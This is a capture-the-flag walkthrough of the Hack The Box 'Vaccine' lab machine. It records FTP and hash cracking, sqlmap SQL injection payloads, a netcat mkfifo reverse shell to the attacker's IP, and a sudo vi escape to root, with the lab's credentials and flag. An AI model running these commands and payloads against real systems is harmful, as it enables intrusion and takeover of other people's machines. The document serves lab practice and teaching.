# Vaccine

URL: https://app.hackthebox.com/starting-point

Level: Very Easy

Start time: 20 Feb 2022, 5:27pm GMT+1

End time: 20 Feb 2022, 6:11am GMT+1


## Walkthrough

### Enumeration

#### NMAP

Basic nmap scan:

```
# Nmap 7.92 scan initiated Sun Feb 20 17:28:13 2022 as: nmap -T4 -p- -oN 01_nmap 10.129.95.48
Nmap scan report for 10.129.95.48
Host is up (0.095s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sun Feb 20 17:28:32 2022 -- 1 IP address (1 host up) scanned in 18.60 seconds
```

Again with -sC and -sV:

```
# Nmap 7.92 scan initiated Sun Feb 20 17:29:22 2022 as: nmap -T4 -p21,22,80 -sC -sV -oN 02_nmap_sC_sV 10.129.95.48
Nmap scan report for 10.129.95.48
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.16.44
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 20 17:29:35 2022 -- 1 IP address (1 host up) scanned in 13.51 seconds
```

We grab `backup.zip` file from anonymous FTP:

```
# wget -m --no-passive-ftp ftp://anonymous:anonymous@10.129.95.48
--2022-02-20 17:30:37--  ftp://anonymous:*password*@10.129.95.48/
           => ‘10.129.95.48/.listing’
Connecting to 10.129.95.48:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.

10.129.95.48/.listing                               [ <=>                                                                                                  ]     187  --.-KB/s    in 0.001s

2022-02-20 17:30:38 (266 KB/s) - ‘10.129.95.48/.listing’ saved [187]

--2022-02-20 17:30:38--  ftp://anonymous:*password*@10.129.95.48/backup.zip
           => ‘10.129.95.48/backup.zip’
==> CWD not required.
==> PORT ... done.    ==> RETR backup.zip ... done.
Length: 2533 (2.5K)

10.129.95.48/backup.zip                         100%[=====================================================================================================>]   2.47K  --.-KB/s    in 0.001s

2022-02-20 17:30:39 (2.77 MB/s) - ‘10.129.95.48/backup.zip’ saved [2533]

FINISHED --2022-02-20 17:30:39--
Total wall clock time: 2.0s
Downloaded: 2 files, 2.7K in 0.002s (1.66 MB/s)
```

Zip file is encrypted, so we need to use `zip2john`:

```
# zip2john backup.zip
```

Output file will be:

```
backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$
```

We crack it:

```
# john toCrack

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
741852963        (backup.zip)
1g 0:00:00:00 DONE 2/3 (2022-02-20 17:39) 8.333g/s 134175p/s 134175c/s 134175C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We found password `741852963` so we are now able to browse archive's content:

```
root@kaligra:/opt/htb-startingpoint/Vaccine# unzip 10.129.95.48/backup.zip
Archive:  10.129.95.48/backup.zip
[10.129.95.48/backup.zip] index.php password:
  inflating: index.php
  inflating: style.css
```

At the beginning of `index.php` file we found an MD5 hash of admin password:

```
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```

We crack it with `hashcat`:

```
root@kaligra:/opt/htb-startingpoint/Vaccine# hashcat -m 0 07_md5_admin_password /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-4770K CPU @ 3.50GHz, 2883/2947 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

2cb42f8734ea607eefed3b70af13bbd3:qwerty789

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 2cb42f8734ea607eefed3b70af13bbd3
Time.Started.....: Sun Feb 20 17:43:30 2022 (0 secs)
Time.Estimated...: Sun Feb 20 17:43:30 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1668.1 kH/s (0.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 100352/14344385 (0.70%)
Rejected.........: 0/100352 (0.00%)
Restore.Point....: 98304/14344385 (0.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Dominic1 -> paashaas

Started: Sun Feb 20 17:42:26 2022
Stopped: Sun Feb 20 17:43:31 2022
```

We can access this login page:

![Screenshot_2022-02-20_17-46-01](https://user-images.githubusercontent.com/42389836/154855426-dc3ee151-53b6-4b22-9f0d-3ff293e33a01.png)

And we reach a simple search form:

![Screenshot_2022-02-20_17-46-24](https://user-images.githubusercontent.com/42389836/154855456-3064f3a7-f606-43b3-909c-ded96f1352d5.png)

We type "asd" and we look at URL:

![Screenshot_2022-02-20_17-46-44](https://user-images.githubusercontent.com/42389836/154855494-fefda1a0-a672-402c-91d8-5c9cb9414850.png)

We put an apex:

![Screenshot_2022-02-20_17-47-04](https://user-images.githubusercontent.com/42389836/154855510-e92829ea-1df0-46ce-bf40-1c1495a0ba98.png)

And we get an error, so we can "talk" to DB. 

Let's fire `sqlmap`, after taking note of our cookie:


![Screenshot_2022-02-20_17-47-55](https://user-images.githubusercontent.com/42389836/154855537-6a3993f4-b588-419f-92f4-42cab1bdb090.png)


#### Sqlmap

![vaccine](https://user-images.githubusercontent.com/42389836/154855584-90ebd232-040a-4c4b-b7d8-c7cbf57b60a1.JPG)

```
root@kaligra:/opt/htb-startingpoint/Vaccine# sqlmap --cookie="PHPSESSID=duflc7b6ttg70vvbnbiahtd02v" -u 'http://10.129.95.48/dashboard.php?search=a'
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:50:38 /2022-02-20/

[17:50:39] [INFO] testing connection to the target URL
[17:50:39] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:50:40] [INFO] testing if the target URL content is stable
[17:50:40] [INFO] target URL content is stable
[17:50:40] [INFO] testing if GET parameter 'search' is dynamic
[17:50:40] [INFO] GET parameter 'search' appears to be dynamic
[17:50:40] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
[17:50:41] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
[17:50:41] [INFO] testing for SQL injection on GET parameter 'search'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n]
[17:50:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:50:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:50:49] [INFO] testing 'Generic inline queries'
[17:50:49] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[17:50:50] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable (with --string="SUV")
[17:50:50] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:50:51] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable
[17:50:51] [INFO] testing 'PostgreSQL inline queries'
[17:50:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:50:51] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[17:51:03] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable
[17:51:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:51:13] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable
[17:51:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=a' AND (SELECT (CASE WHEN (9435=9435) THEN NULL ELSE CAST((CHR(83)||CHR(75)||CHR(84)||CHR(105)) AS NUMERIC) END)) IS NULL-- jtUv

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=a' AND 1858=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (1858=1858) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- Gpoj

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=a';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=a' AND 5728=(SELECT 5728 FROM PG_SLEEP(5))-- JQCp
---
[17:51:18] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[17:51:20] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.129.95.48'

[*] ending @ 17:51:20 /2022-02-20/
```

We can use `--os-shell` to get an interactive shell:

```
root@kaligra:/opt/htb-startingpoint/Vaccine# sqlmap --cookie="PHPSESSID=duflc7b6ttg70vvbnbiahtd02v" -u 'http://10.129.95.48/dashboard.php?search=a' --os-shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.11#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:51:47 /2022-02-20/

[17:51:47] [INFO] resuming back-end DBMS 'postgresql'
[17:51:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=a' AND (SELECT (CASE WHEN (9435=9435) THEN NULL ELSE CAST((CHR(83)||CHR(75)||CHR(84)||CHR(105)) AS NUMERIC) END)) IS NULL-- jtUv

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=a' AND 1858=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (1858=1858) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(120)||CHR(120)||CHR(113)) AS NUMERIC)-- Gpoj

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=a';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=a' AND 5728=(SELECT 5728 FROM PG_SLEEP(5))-- JQCp
---
[17:51:47] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[17:51:47] [INFO] fingerprinting the back-end DBMS operating system
[17:51:48] [INFO] the back-end DBMS operating system is Linux
[17:51:49] [INFO] testing if current user is DBA
[17:51:50] [INFO] retrieved: '1'
[17:51:50] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[17:51:50] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell>
```

We are `postgres` user right now:

```
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] n
[17:57:05] [INFO] retrieved: 'uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)'
```

Since our shell is very unstable, we re-run sqlmap with `--threads` option:

```
sqlmap --cookie="PHPSESSID=duflc7b6ttg70vvbnbiahtd02v" -u 'http://10.129.95.48/dashboard.php?search=a' --os-shell --threads 10
```

We spawn a netcat listener to get a reverse shell:

```
root@kaligra:/opt/htb-startingpoint/Vaccine# nc -nlvp 4444
listening on [any] 4444 ...



os-shell> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 4444 >/tmp/f


connect to [10.10.16.44] from (UNKNOWN) [10.129.95.48] 54540
/bin/sh: 0: can't access tty; job control turned off
$
```

We try to explore document_root for `postgres` credentials:

```
postgres@vaccine:/var/www/html$ grep postgre dashboard.php
grep postgre dashboard.php
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

#### Privesc

We try `sudo -l`:

```
postgres@vaccine:/var/www/html$ sudo -l
sudo -l
[sudo] password for postgres: P@s5w0rd!

Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

So we can easily get root access thanks to `vi`:

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf


:!/bin/bashL Client Authentication Configuration File
# ===================================================
#
# Refer to the "Client Authentication" section in the PostgreSQL
# documentation for a complete description of this file.  A short
# synopsis follows.
#
# This file controls: which hosts are allowed to connect, how clients
# are authenticated, which PostgreSQL user names they can use, which
# databases they can access.  Records take one of these forms:
#
# local      DATABASE  USER  METHOD  [OPTIONS]
# host       DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
# hostssl    DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
# hostnossl  DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
#
# (The uppercase items must be replaced by actual values.)
#
# The first field is the connection type: "local" is a Unix-domain
# socket, "host" is either a plain or SSL-encrypted TCP/IP socket,
# "hostssl" is an SSL-encrypted TCP/IP socket, and "hostnossl" is a
# plain TCP/IP socket.
#
:!/bin/bash
root@vaccine:/var/lib/postgresql/11/main# id
id
uid=0(root) gid=0(root) groups=0(root)
root@vaccine:/var/lib/postgresql/11/main# cd
cd
root@vaccine:~# ls
ls
pg_hba.conf  root.txt  snap
root@vaccine:~# cat root.txt
cat root.txt
dd6e058e814260bc70e9bbdef2715849
```



